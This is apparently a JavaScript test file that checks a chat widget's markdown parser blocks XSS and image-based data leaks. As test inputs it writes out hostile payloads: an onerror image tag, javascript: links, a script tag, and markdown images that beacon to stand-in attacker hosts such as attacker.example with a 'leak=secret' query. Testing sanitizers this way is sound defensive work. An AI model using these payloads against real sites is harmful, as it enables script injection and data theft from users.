import { describe, it, expect, afterEach } from 'vitest';
import { parseMarkdown, htmlToText, escapeHtml, isAllowedImageSrc } from '../src/markdown.js';
import { configureEndpoints } from '../src/endpoints.js';

// The markdown parser is regex-based and deliberately leans on DOMPurify as the
// real security boundary. These tests pin that boundary: the parser must never
// emit a working XSS vector, and the copy helper must never expose the
// element.innerHTML sink it replaced.
describe('parseMarkdown — formatting', () => {
  it('renders bold and italic', () => {
    expect(parseMarkdown('**bold**')).toContain('<strong>bold</strong>');
    expect(parseMarkdown('*italic*')).toContain('<em>italic</em>');
  });

  it('renders links with forced safe rel/target', () => {
    const html = parseMarkdown('[site](https://example.com)');
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('target="_blank"');
  });

  it('returns empty string for empty/nullish input', () => {
    expect(parseMarkdown('')).toBe('');
    expect(parseMarkdown(null)).toBe('');
    expect(parseMarkdown(undefined)).toBe('');
  });
});

describe('parseMarkdown — sanitization (security)', () => {
  it('neutralizes raw HTML by escaping it — no live element or inline handler', () => {
    const html = parseMarkdown('<img src=x onerror="alert(1)">');
    // The parser escapes all raw input before transforming, so the payload
    // becomes inert text (&lt;img…) rather than a live <img> with an onerror.
    expect(html).not.toMatch(/<[a-z]+[^>]*\son\w+=/i);
    expect(html).toContain('&lt;img');
  });

  it('drops javascript: link protocols (DOMPurify on generated anchors)', () => {
    const html = parseMarkdown('[click](javascript:alert(1))');
    expect(html.toLowerCase()).not.toContain('javascript:');
  });

  it('does not emit a live <script> element', () => {
    const html = parseMarkdown('hello <script>alert(1)</script>');
    expect(html).not.toMatch(/<script/i);
  });

  it('drops non-https image sources (no IP-beaconing http img)', () => {
    const html = parseMarkdown('![x](http://evil.example/track.gif)');
    expect(imageSources(html)).toEqual([]);
    expect(html).not.toMatch(/<img[^>]*evil\.example/);
  });
});

// Parse the sanitized output the way the widget does (innerHTML) and list the
// src of every <img> the browser would load.
function imageSources(html) {
  const template = document.createElement('template');
  template.innerHTML = html;
  return [...template.content.querySelectorAll('img')]
    .map(img => img.getAttribute('src'))
    .filter(Boolean);
}

describe('parseMarkdown — image exfiltration guard', () => {
  afterEach(() => configureEndpoints(undefined));

  it('does not load an image from a third-party https origin', () => {
    const html = parseMarkdown('![](https://attacker.example/pixel.gif?leak=secret)');
    expect(imageSources(html)).toEqual([]);
    expect(html).not.toMatch(/<img/);
  });

  it('renders a disallowed image as a click-only link labelled with its alt text', () => {
    const html = parseMarkdown('![Product photo](https://cdn.other.example/p.png)');
    const template = document.createElement('template');
    template.innerHTML = html;
    const link = template.content.querySelector('a');
    expect(link).not.toBeNull();
    expect(link.getAttribute('href')).toBe('https://cdn.other.example/p.png');
    expect(link.textContent).toBe('Product photo');
    expect(link.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('labels the fallback link with the URL when the alt text is empty', () => {
    const html = parseMarkdown('![](https://cdn.other.example/p.png)');
    expect(html).toContain('>https://cdn.other.example/p.png</a>');
  });

  it('keeps images served from the widget API origin', () => {
    configureEndpoints({ apiUrl: 'https://app.chatvia.test/widget' });
    const html = parseMarkdown('![chunk](https://app.chatvia.test/storage/chunk.png)');
    expect(imageSources(html)).toEqual(['https://app.chatvia.test/storage/chunk.png']);
  });

  it('keeps same-origin images (the page the widget runs on)', () => {
    const src = `${window.location.origin}/images/product.png`;
    expect(imageSources(parseMarkdown(`![p](${src})`))).toEqual([src]);
    expect(imageSources(parseMarkdown('![p](/images/product.png)'))).toEqual([
      '/images/product.png'
    ]);
  });

  it('keeps inline raster data: images but not SVG data: images', () => {
    const png = 'data:image/png;base64,iVBORw0KGgo=';
    expect(imageSources(parseMarkdown(`![p](${png})`))).toEqual([png]);

    const svg = parseMarkdown('![s](data:image/svg+xml;base64,PHN2Zz4=)');
    expect(imageSources(svg)).toEqual([]);
    expect(svg).not.toContain('data:image/svg+xml');
  });

  it('checks the origin after HTML-escaping, so an escaped URL cannot slip through', () => {
    configureEndpoints({ apiUrl: 'https://app.chatvia.test/widget' });
    const html = parseMarkdown(
      '![x](https://attacker.example/a.png?u=https://app.chatvia.test&x=1)'
    );
    expect(imageSources(html)).toEqual([]);
  });

  it('isAllowedImageSrc rejects non-http(s) schemes', () => {
    expect(isAllowedImageSrc('javascript:alert(1)')).toBe(false);
    expect(isAllowedImageSrc('ftp://example.com/a.png')).toBe(false);
    expect(isAllowedImageSrc('')).toBe(false);
  });
});

describe('htmlToText — safe plain-text extraction for copy', () => {
  it('strips markup without executing it', () => {
    expect(htmlToText('<b>hi</b>')).toBe('hi');
    expect(htmlToText('<img src=x onerror="alert(1)">')).not.toContain('onerror');
  });

  it('passes through plain markdown source unchanged', () => {
    expect(htmlToText('**hi**')).toBe('**hi**');
  });

  it('handles nullish input', () => {
    expect(htmlToText(null)).toBe('');
    expect(htmlToText(undefined)).toBe('');
  });
});

describe('escapeHtml', () => {
  it('escapes the five core entities', () => {
    expect(escapeHtml(`<>&"'`)).toBe('&lt;&gt;&amp;&quot;&#039;');
  });
});

describe('escapeHtml nullish input', () => {
  it('returns an empty string for null and undefined, but keeps 0', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
    expect(escapeHtml(0)).toBe('0');
  });
});

describe('unordered lists', () => {
  it.each(['-', '+'])('turns "%s item" lines into a list', marker => {
    const html = parseMarkdown(`${marker} first\n${marker} second`);
    expect(html).toContain('<ul>');
    expect(html).toContain('<li>first</li>');
    expect(html).toContain('<li>second</li>');
  });
});
